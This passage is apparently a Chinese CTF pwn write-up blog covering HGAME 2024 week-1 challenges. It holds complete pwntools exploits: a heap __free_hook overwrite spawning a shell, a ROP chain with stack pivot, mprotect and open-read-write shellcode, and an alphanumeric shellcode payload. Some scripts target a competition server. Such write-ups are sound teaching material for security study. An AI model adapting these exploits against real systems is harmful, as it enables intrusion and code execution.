punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'num:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ecbe0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basefree_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> shellcode </tag>
            
            <tag> fmt </tag>
            
            <tag> 数组溢出 </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME-2024-week1-pwn</title>
      <link href="/2024/02/08/hgame-2024-week1-pwn/hgame-2024-week1-pwn/"/>
      <url>/2024/02/08/hgame-2024-week1-pwn/hgame-2024-week1-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="Elden-Ring-I"><a href="#Elden-Ring-I" class="headerlink" title="Elden Ring I"></a>Elden Ring I</h2><p>可执行文件直接运行会显示没有这个文件，<code>patchelf</code>换一下<code>libc</code>和<code>ldd</code>就好了</p><p>开了沙箱，禁用<code>execve</code>只能<code>orw</code>，由于没有可执行段所以还要<code>mprotect</code>创建一段可读写执行的空间</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">seccomp-tools dump ./pwn                                                      line  CODE  JT   JF      K<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> 0000: 0x20 0x00 0x00 0x00000004  A <span class="token operator">=</span> arch 0001: 0x15 0x00 0x06 0xc000003e  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_X86_64<span class="token punctuation">)</span> goto 0008 0002: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number 0003: 0x35 0x00 0x01 0x40000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;</span> 0x40000000<span class="token punctuation">)</span> goto 0005 0004: 0x15 0x00 0x03 0xffffffff  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> 0xffffffff<span class="token punctuation">)</span> goto 0008 0005: 0x15 0x02 0x00 0x0000003b  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> execve<span class="token punctuation">)</span> goto 0008 0006: 0x15 0x01 0x00 0x00000142  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> execveat<span class="token punctuation">)</span> goto 0008 0007: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW 0008: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>检查保护，地址随机化</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">checksec pwn                                                            <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game_2024/hgame/ring/pwn'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x3fd000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选一段写入并执行<code>shellcode</code>，我选的是<code>0x404100</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> vmmapLEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA             Start                End Perm     Size Offset File          0x3fd000           0x400000 rw-p     <span class="token number">3000</span>      <span class="token number">0</span> /home/starrysky/game_2024/hgame/ring/pwn          0x400000           0x401000 r--p     <span class="token number">1000</span>   <span class="token number">3000</span> /home/starrysky/game_2024/hgame/ring/pwn          0x401000           0x402000 r-xp     <span class="token number">1000</span>   <span class="token number">4000</span> /home/starrysky/game_2024/hgame/ring/pwn          0x402000           0x403000 r--p     <span class="token number">1000</span>   <span class="token number">5000</span> /home/starrysky/game_2024/hgame/ring/pwn          0x403000           0x404000 r--p     <span class="token number">1000</span>   <span class="token number">5000</span> /home/starrysky/game_2024/hgame/ring/pwn          0x404000           0x405000 rw-p     <span class="token number">1000</span>   <span class="token number">6000</span> /home/starrysky/game_2024/hgame/ring/pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数很短，可以利用的空间也短，只能溢出<code>0x30</code>，去掉<code>rbp</code>就是<code>0x28</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-100h] BYREF</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Greetings. Traveller from beyond the fog. I Am Melina. I offer you an accord.\\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x130uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以需要栈迁移到<code>buf</code>的起始位置</p><p>总结一下：需要调用<code>mprotect</code>给<code>0x404100</code>权限，所以需要泄露<code>libc</code>调用<code>mprotect</code></p><pre class="line-numbers language-none"><code class="language-none">需要栈迁移到输入的起始位置，所以需要泄露栈地址给&#96;0x404100&#96;权限后向该地址写入&#96;shellcode&#96;实现&#96;orw&#96;再返回到这个地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>写的时候可能有一些细节问题，慢慢调试就好，也可能我写的复杂了</p><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.100.137.175'</span><span class="token punctuation">,</span> <span class="token number">30511</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013e3</span>addr <span class="token operator">=</span> <span class="token number">0x40125B</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'you an accord.'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>read_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base bss <span class="token operator">=</span> <span class="token number">0x404100</span>pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x00000000004013e1</span>environ <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__environ'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'you an accord.'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1e8</span>leave_ret <span class="token operator">=</span> <span class="token number">0x401290</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x0000000000142c92</span> <span class="token operator">+</span> libc_basemprotect <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x404000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'you an accord.'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> bss <span class="token operator">+</span> <span class="token number">0x300</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> bss <span class="token operator">+</span> <span class="token number">0x300</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>考察的是强制类型转化导致的整型溢出和可见字符<code>shellcode</code></p><p>限制了<code>shellcode</code>长度，输入的变量是<code>unsigned int</code>类型，且限制输入的数字不超过两位，比较的时候会强制转化<code>int</code>类型，输入<code>-1</code>就会先被强制转化成一个很大的整数，而这个数超过了<code>int</code>的最大值，所以比较的时候强制转化之后会变成负数从而绕过长度限制</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span> __cdecl main<span class="token punctuation">(</span><span class="token builtin">int</span> argc<span class="token punctuation">,</span> const char <span class="token operator">**</span>argv<span class="token punctuation">,</span> const char <span class="token operator">**</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  unsigned <span class="token builtin">int</span> v4<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>14h<span class="token punctuation">]</span> BYREF  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  printf<span class="token punctuation">(</span><span class="token string">"input the length of your shellcode:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  __isoc99_scanf<span class="token punctuation">(</span><span class="token string">"%2d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>v4 <span class="token operator">&lt;=</span> <span class="token number">0xA</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    printf<span class="token punctuation">(</span><span class="token string">"input your shellcode:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    myread<span class="token punctuation">(</span>v5<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>my_read</code>函数中限制了输入内容必须是可见字符，上网搜一下就好了，<a href="https://nuoye-blog.github.io/2020/05/09/dea90f48/#/">https://nuoye-blog.github.io/2020/05/09/dea90f48/#/</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">unsigned __int64 __fastcall myread<span class="token punctuation">(</span>void <span class="token operator">*</span>a1<span class="token punctuation">,</span> unsigned <span class="token builtin">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v3 <span class="token operator">&lt;=</span> <span class="token string">'`'</span> <span class="token operator">|</span><span class="token operator">|</span> v3 <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token punctuation">(</span>v3 <span class="token operator">&lt;=</span> <span class="token string">'@'</span> <span class="token operator">|</span><span class="token operator">|</span> v3 <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token punctuation">(</span>v3 <span class="token operator">&lt;=</span> <span class="token string">'/'</span> <span class="token operator">|</span><span class="token operator">|</span> v3 <span class="token operator">></span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      puts<span class="token punctuation">(</span><span class="token string">"Invalid character\\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v6 <span class="token operator">-</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终主要代码只有两行，exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.100.137.175'</span><span class="token punctuation">,</span> <span class="token number">31445</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'length of your shellcode:'</span><span class="token punctuation">,</span> <span class="token string">b'-1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your shellcode:'</span><span class="token punctuation">,</span> <span class="token string">b'PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Elden-Random-Challenge"><a href="#Elden-Random-Challenge" class="headerlink" title="Elden Random Challenge"></a>Elden Random Challenge</h2><p>解出人数倒数第二的题，一开始就直接写这个了，估计大部分人都从前往后写嘛，虽然最后也没抢到一血，这题难倒没什么难点就是一开始报错不存在这个文件给我琢磨了一会</p><p>先检查保护，没有开地址随机化</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">checksec pwn<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game_2024/hgame/random/pwn'</span>    Arch<span class="token punctuation">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token punctuation">:</span>    Partial RELRO    Stack<span class="token punctuation">:</span>    No canary found    NX<span class="token punctuation">:</span>       NX enabled    PIE<span class="token punctuation">:</span>      No PIE <span class="token punctuation">(</span><span class="token number">0x3fe000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前面99次输入随机数，直接c和python联合编程即可，最后执行到<code>myread</code>，可以溢出，<code>ret2libc</code></p><p>题目里存在输入<code>name</code>的本意应该是通过<code>name</code>覆盖<code>seed</code>，但是联合<code>c</code>直接获取时间也很方便</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span> __cdecl main<span class="token punctuation">(</span><span class="token builtin">int</span> argc<span class="token punctuation">,</span> const char <span class="token operator">**</span>argv<span class="token punctuation">,</span> const char <span class="token operator">**</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token builtin">int</span> v4<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>18h<span class="token punctuation">]</span> BYREF  char buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>Eh<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>12h<span class="token punctuation">]</span> BYREF  <span class="token builtin">int</span> 